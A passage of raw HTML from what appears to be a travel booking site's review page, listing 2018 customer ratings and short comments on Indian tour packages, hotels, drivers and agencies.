                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Nov 2018</small></h5>
                      <p style="margin:0px;">Awesome tour agency. Excellent service at affordable cost. Mr. Vee Kay made sure we throughly enjoyed our trip. Highly recommended. Thank you so much weekend with nature for making the trip memorable for me as well as my family. Keep rocking.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Arpita Saha   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Oct 2018</small></h5>
                      <p style="margin:0px;">Best tour till date. Memories to cherish life long</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Samit Bhattacharjee for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Oct 2018</small></h5>
                      <p style="margin:0px;">Excellent</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gopi krishna  for South-India trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Oct 2018</small></h5>
                      <p style="margin:0px;">Trip enjoyed a lot but national residency Mysore room service very bad. No complimentary break fast.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from hitesh  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Oct 2018</small></h5>
                      <p style="margin:0px;">Nice trip conducted by Yes Tourisum india and travelsetu.com.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Satyajit Saikia for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Sep 2018</small></h5>
                      <p style="margin:0px;">good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from SHIBAJI  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Sep 2018</small></h5>
                      <p style="margin:0px;">It was a amazing experience..thank you Best Holidays India Pvt Ltd.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rajesh kumar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Sep 2018</small></h5>
                      <p style="margin:0px;">Good presence trips </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from sameer khanna  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Sep 2018</small></h5>
                      <p style="margin:0px;">Experience was really good </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Lavanya  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Sep 2018</small></h5>
                      <p style="margin:0px;">I was nice</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rohit  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Sep 2018</small></h5>
                      <p style="margin:0px;">Good experience...</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from kishore  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, Aug 2018</small></h5>
                      <p style="margin:0px;">Great tour arranged by Travel Tropico. Abhisekh was very helpful and he arranged the tour without any issues. Accommodation was good. All day trips arranged on time and covered all areas in Andaman. Would like to recommend Travel Tropico to all friends and family.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from SRINIVAS CHIDRI  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Aug 2018</small></h5>
                      <p style="margin:0px;">Awesome fully satisfied</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rohit  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Aug 2018</small></h5>
                      <p style="margin:0px;">Good service</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kashyap  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;21st, Aug 2018</small></h5>
                      <p style="margin:0px;">Its a Wonderful trip. Package was very cheap than others. Services were awesome from driver to service provider. Just hotel food was ok ok type. I'll definitely suggest others to try once.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Haresh Pattnaik  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Aug 2018</small></h5>
                      <p style="margin:0px;">Munnar Hotel Package was not appreciated by the team members due to Poor service & catering facilities.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dharmendra Patidar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Aug 2018</small></h5>
                      <p style="margin:0px;">Its too good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rehan ansari  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jul 2018</small></h5>
                      <p style="margin:0px;">We wanted to thank you very much for planning our trips to Manali and shimla.it was amazing and wonderful trip and exceeded my expectations . your hospitality was very good and a special thanks to Shubham Sharma  thanks and regards Mr and Mrs Ansari </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from RAJENDRA SHANDILYA  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Jul 2018</small></h5>
                      <p style="margin:0px;">Correct the journey start date. 5th sept to 11th sept</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shubham Sharma  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Jul 2018</small></h5>
                      <p style="margin:0px;">Really we all are enjoyed,very nice accomodation and great experience with them & special thanks to Anjali.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mustafa katka  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Jul 2018</small></h5>
                      <p style="margin:0px;">NA</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from sadat ahmad  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Jun 2018</small></h5>
                      <p style="margin:0px;">We are very thankful to GR travel for giving  me well managed tour package </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Aarti Agrawal  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Jun 2018</small></h5>
                      <p style="margin:0px;">Awesome trip service was excellent in shimla (hotel paradise regency) </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ritika  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Jun 2018</small></h5>
                      <p style="margin:0px;">Amazing service had a good experience.I m fully satisfied  with it.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rucha  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Jun 2018</small></h5>
                      <p style="margin:0px;">It was amazing trip by assure trips suggested by travelsetu enjoyed alot perfect arrangements and hotels totally satisfied .Ã°ÂŸÂ˜ÂŒâ˜ºï¸Ã°ÂŸÂ‘Â</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mohit  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Jun 2018</small></h5>
                      <p style="margin:0px;">Fantastic job done by Pooja & jyoti..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ambrish Kumar tiwari  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Jun 2018</small></h5>
                      <p style="margin:0px;">Very bad</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Anita Bhagyaraj  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Jun 2018</small></h5>
                      <p style="margin:0px;">Very good package with awesome location</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shubham Gupta   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Jun 2018</small></h5>
                      <p style="margin:0px;">Fantastic trip arrange by ms katyani mam.special thanks to u</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ABDUL RAHMAN  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Jun 2018</small></h5>
                      <p style="margin:0px;">Excellent Trip was organised by MM travel. Everything was well organized from hotels to sight seeing.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Kishore Kumar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Jun 2018</small></h5>
                      <p style="margin:0px;">Had a wonderful trip with great memories to carry back home.<br />
    Got very good deal within my budget. Thanks to Tourist Traingle Mr. Sudhanshu for fitting the package within my budget.<br />
    Car condition and car driver were excellent. <br />
    Except Flower dale hotel at Shimla all other hotels met our expectation.<br />
    Route to Flower dale hotel was very narrow and car driver denied to drive to the hotel. Hotel was not at all 3star category. Very highly priced.<br />
    Hotel Sagar Villa at Manali was a good property at good location, prompt service needs to be improved. Very economically priced.<br />
    Hotel Sai Taj grand staff are not flexible but location and property is good.<br />
    Hotel R C Resigency at Amritsar is wonderful property and great staff with prompt service. Felt like home with their caring.<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Neel  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Jun 2018</small></h5>
                      <p style="margin:0px;">Everything is great except nathula trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Anil Patel  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, May 2018</small></h5>
                      <p style="margin:0px;">It was good experience. MR. Praveen was so responsive on all matter. Just had issue with Houseboat as it was not neat and clean. It was kind of boring experience as we checked into houseboat and 1 PM and they park houseboat at 5 PM. Also houseboat was parked at very dirty area where dirty smell coming in. Staff of houseboat was not able to understand Hindi or English. So i was hard for us to get time going from 5 PM to next day morning. <br />
    <br />
    Thank you <br />
    Anil Patel  </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from RADHARAMAN PANDEY  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, May 2018</small></h5>
                      <p style="margin:0px;">Hi <br />
    Everything was well planned by travelsetu team. I haven't faced any difficulty on journey. It was easy going journey. <br />
    Thanks </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Bageshree Gadkari  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;30th, May 2018</small></h5>
                      <p style="margin:0px;">Best Holidays as the name itself served us (group of 6) with best of services, itinerary, stay.<br />
    The travel was awesome, driver Alex was the best!!<br />
    Appropriately priced. Comfortable stay as well. Overall good value for money.<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jaydip  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, May 2018</small></h5>
                      <p style="margin:0px;">Trip is awesome</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sunil   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, May 2018</small></h5>
                      <p style="margin:0px;">over all nice and comfort trip.<br />
    hotel in Shimla ( hotel royal view) is good but their meal arrangement is poor. They serve break fast and dinner not on time. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ADITYA  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, May 2018</small></h5>
                      <p style="margin:0px;">Excellent travels</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prasad  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, May 2018</small></h5>
                      <p style="margin:0px;">Excellent and awesome package and trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from kiran patel  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, May 2018</small></h5>
                      <p style="margin:0px;">I have been himachal trip on 8/5/2018.thereni was no care taken and we have face lots of problem. From the yes tourist Ltd.miss managmnent</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from AMAR GHOSALKAR  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, May 2018</small></h5>
                      <p style="margin:0px;">Nice Arrangement, Guide, Vehicle......Thank you Travel Mysteries.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Hiren soni  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, May 2018</small></h5>
                      <p style="margin:0px;">Ok</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Bhim singh kushwaha  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, May 2018</small></h5>
                      <p style="margin:0px;">It was really a great experience. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Singh  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Apr 2018</small></h5>
                      <p style="margin:0px;">Transport facility:good<br />
    Hotel facility: fine<br />
    payment policy:not good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sopan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Apr 2018</small></h5>
                      <p style="margin:0px;">It was a great trip. Thanks to Tourist Triangle team for all the arrangements. Driver of our vehicle was great person. We are thankful to him for his best service. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from anish  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Apr 2018</small></h5>
                      <p style="margin:0px;">Good quality hotel and transportation</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Suhail khan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Mar 2018</small></h5>
                      <p style="margin:0px;">Trip was nice thanks to driver gurpreet and planner akhil</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mujib  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Mar 2018</small></h5>
                      <p style="margin:0px;">Good trip nice palace </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gagan patel  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, Mar 2018</small></h5>
                      <p style="margin:0px;">Nice trip but tourism spots were not filling the expectations. Just good not the best</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nikhil  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Mar 2018</small></h5>
                      <p style="margin:0px;">The bookings that were given by Raisonee travels were really good. They told me each and every thing about the trip. <br />
    We had a beautiful trip and will definitely recommend it to others as well.<br />
    Thanks for such a lovely trip.<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sandipan Chowdhury  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Mar 2018</small></h5>
                      <p style="margin:0px;">Awesome experiences with Himalayan trip llp</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Divakar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Mar 2018</small></h5>
                      <p style="margin:0px;">Had a fantastic Honey mooon with my beloved .... surely recommended ..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from leela  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Feb 2018</small></h5>
                      <p style="margin:0px;">Great experiece with this company . enjoyed a lot.. v nice trip with vidut travel. Fantastic</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from H s pal  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Feb 2018</small></h5>
                      <p style="margin:0px;">NA</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Brijesh  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Feb 2018</small></h5>
